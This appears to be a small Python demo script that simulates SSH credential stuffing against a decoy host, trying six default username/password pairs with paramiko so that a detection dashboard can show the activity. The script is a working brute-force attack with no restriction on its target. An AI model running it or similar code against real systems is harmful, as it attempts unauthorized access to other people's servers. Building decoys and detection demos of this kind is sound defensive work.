"""
ssh_bruteforce_sim.py
Simple SSH credential-stuffing simulator for demo purposes.
Run this FROM THE ATTACKER MACHINE/VM against the decoy.

Usage:
    python ssh_bruteforce_sim.py <target_ip> [port]
"""

import sys
import time
import paramiko

TARGET = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 2222

CREDENTIALS = [
    ("admin", "admin"),
    ("admin", "password"),
    ("root", "toor"),
    ("root", "123456"),
    ("user", "letmein"),
    ("test", "test123"),
]

for username, password in CREDENTIALS:
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        print(f"Trying {username}:{password} ...")
        client.connect(TARGET, port=PORT, username=username, password=password,
                        timeout=5, banner_timeout=5, auth_timeout=5)
    except paramiko.AuthenticationException:
        print("  -> rejected (expected - this is a decoy)")
    except Exception as e:
        print(f"  -> connection issue: {e}")
    finally:
        try:
            client.close()
        except Exception:
            pass
    time.sleep(1)

print("\nDone. Check the dashboard at http://<victim-ip>:9000 for the escalating score.")
